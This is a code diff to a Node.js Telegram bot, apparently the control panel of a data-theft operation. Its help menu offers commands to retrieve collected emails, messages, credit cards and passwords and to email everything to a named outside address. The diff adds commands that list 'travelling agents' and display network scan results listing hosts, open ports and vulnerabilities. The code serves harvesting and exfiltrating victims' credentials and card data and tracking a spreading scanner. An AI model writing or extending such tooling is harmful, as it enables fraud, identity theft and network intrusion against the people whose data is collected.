@@ -53,31 +53,33 @@ function checkAuth(msg, callback) {
 bot.onText(/\/start/, (msg) => {
     checkAuth(msg, () => {
         const chatId = msg.chat.id;
-        bot.sendMessage(chatId, `NUPI DATA RETRIEVAL BOT
+        bot.sendMessage(chatId, `🤖 NUPI DATA RETRIEVAL BOT
 
 🔐 Access Confirmed
 
-EASY COMMANDS (Just type these):
-
+📊 DATA COLLECTION:
 /data - Overview of all collected data
 /senddata - 📧 Email ALL data to jedarius.m@yahoo.com
-
-GET ALL DATA:
 /getemails - Get ALL emails collected
 /getmessages - Get ALL messages collected  
 /getcards - Get ALL credit cards collected
 /getpasswords - Get ALL passwords collected
 
-OTHER COMMANDS:
+🌐 TRAVELLING AGENT (NEW):
+/agents - List all travelling agents
+/exposure - 🔒 Network security exposure report
+/network - Quick network status overview
+
+📱 SYSTEM:
 /devices - List all tracked devices
 /stats - System statistics
 /stream - Recent activity
 
-Just type the command and hit send!
-No device IDs or complicated stuff needed.
+💡 Just type any command and press send!
 
-Example: Just type /getemails and press send
-Or type /senddata to email everything to yourself!
+Example: /exposure to see network vulnerabilities
+         /agents to see all active travelling agents
+         /senddata to email everything to yourself!
         `);
     });
 });
@@ -837,6 +839,158 @@ bot.onText(/\/all/, (msg) => {
             bot.sendMessage(chatId, '✅ Data dump complete!');
             
         } catch (error) {
+            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
+    });
+});
+
+// 🌐 /agents - Get all travelling agents
+bot.onText(/\/agents/, async (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, '🔍 Fetching travelling agents...');
+            
+            const response = await axios.get(`${NUPI_API}/api/travelling-agents`, {
+                headers: { 'x-api-key': NUPI_API_KEY }
+            });
+            
+            if (response.data.success) {
+                const agents = response.data.agents || [];
+                const total = response.data.total_agents || 0;
+                
+                let message = `🌍 TRAVELLING AGENTS (${total})\n\n`;
+                
+                if (agents.length === 0) {
+                    message += '❌ No agents found';
+                } else {
+                    agents.forEach((agent, index) => {
+                        message += `${index + 1}. Agent ${agent.agent_id.substring(0, 8)}\n`;
+                        message += `   📍 Location: ${agent.current_location}\n`;
+                        message += `   🔄 Visits: ${agent.visit_count}\n`;
+                        message += `   ☁️  In Cloud: ${agent.in_cloud ? 'Yes' : 'No'}\n`;
+                        message += `   📅 Last seen: ${new Date(agent.last_seen).toLocaleString()}\n\n`;
+                    });
+                }
+                
+                safeSendMessage(chatId, message);
+            } else {
+                bot.sendMessage(chatId, '❌ Failed to fetch agents');
+            }
+        } catch (error) {
+            console.error('Error fetching agents:', error);
+            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
+    });
+});
+
+// 🔒 /exposure - Get network exposure reports (CRITICAL SECURITY DATA)
+bot.onText(/\/exposure/, async (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            bot.sendMessage(chatId, '🔍 Fetching exposure reports...');
+            
+            const response = await axios.get(`${NUPI_API}/api/travelling-agents/exposure-reports`, {
+                headers: { 'x-api-key': NUPI_API_KEY }
+            });
+            
+            if (response.data.success) {
+                const reports = response.data.reports || [];
+                const stats = response.data.stats || {};
+                
+                let message = `🔒 NETWORK EXPOSURE REPORT\n\n`;
+                message += `📊 SUMMARY:\n`;
+                message += `   Total Devices Scanned: ${stats.total_devices_scanned || 0}\n`;
+                message += `   🚨 High Risk: ${stats.high_risk_devices || 0}\n`;
+                message += `   ⚠️  Medium Risk: ${stats.medium_risk_devices || 0}\n`;
+                message += `   ✅ Low Risk: ${stats.low_risk_devices || 0}\n`;
+                message += `   Total Vulnerabilities: ${stats.total_vulnerabilities || 0}\n`;
+                message += `   Open Ports: ${stats.total_open_ports || 0}\n\n`;
+                
+                if (reports.length === 0) {
+                    message += '❌ No exposure data yet\n';
+                    message += 'Agent will scan network every 2 minutes';
+                } else {
+                    message += `🔍 RECENT FINDINGS (${Math.min(5, reports.length)}):\n\n`;
+                    
+                    reports.slice(0, 5).forEach((report, index) => {
+                        message += `${index + 1}. ${report.target_hostname} (${report.target_ip})\n`;
+                        message += `   Risk: ${report.risk_level}\n`;
+                        message += `   Device: ${report.device_type || 'Unknown'}\n`;
+                        message += `   Open Ports: ${report.open_ports.length}\n`;
+                        
+                        if (report.vulnerabilities.length > 0) {
+                            message += `   🚨 Vulnerabilities:\n`;
+                            report.vulnerabilities.forEach(vuln => {
+                                message += `      - ${vuln}\n`;
+                            });
+                        }
+                        
+                        if (report.services.length > 0) {
+                            message += `   Services: `;
+                            report.services.slice(0, 3).forEach(svc => {
+                                message += `${svc.service} `;
+                            });
+                            message += `\n`;
+                        }
+                        
+                        message += `   Scanned: ${new Date(report.timestamp).toLocaleString()}\n\n`;
+                    });
+                    
+                    if (reports.length > 5) {
+                        message += `\n... and ${reports.length - 5} more devices scanned`;
+                    }
+                }
+                
+                safeSendMessage(chatId, message);
+            } else {
+                bot.sendMessage(chatId, '❌ Failed to fetch exposure reports');
+            }
+        } catch (error) {
+            console.error('Error fetching exposure reports:', error);
+            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        }
+    });
+});
+
+// 📡 /network - Quick network status
+bot.onText(/\/network/, async (msg) => {
+    checkAuth(msg, async () => {
+        const chatId = msg.chat.id;
+        
+        try {
+            const [agentsRes, exposureRes] = await Promise.all([
+                axios.get(`${NUPI_API}/api/travelling-agents`, {
+                    headers: { 'x-api-key': NUPI_API_KEY }
+                }),
+                axios.get(`${NUPI_API}/api/travelling-agents/exposure-reports`, {
+                    headers: { 'x-api-key': NUPI_API_KEY }
+                })
+            ]);
+            
+            const agents = agentsRes.data.agents || [];
+            const stats = exposureRes.data.stats || {};
+            
+            let message = `🌐 NETWORK STATUS\n\n`;
+            message += `🤖 Active Agents: ${agents.length}\n`;
+            message += `📱 Devices Scanned: ${stats.total_devices_scanned || 0}\n`;
+            message += `🚨 Security Issues: ${stats.total_vulnerabilities || 0}\n`;
+            message += `🔓 Open Ports: ${stats.total_open_ports || 0}\n\n`;
+            
+            message += `RISK BREAKDOWN:\n`;
+            message += `🔴 High: ${stats.high_risk_devices || 0}\n`;
+            message += `🟡 Medium: ${stats.medium_risk_devices || 0}\n`;
+            message += `🟢 Low: ${stats.low_risk_devices || 0}\n\n`;
+            
+            message += `Use /agents for agent details\n`;
+            message += `Use /exposure for full report`;
+            
+            safeSendMessage(chatId, message);
+        } catch (error) {
+            console.error('Error fetching network status:', error);
             bot.sendMessage(chatId, `❌ Error: ${error.message}`);
         }
     });
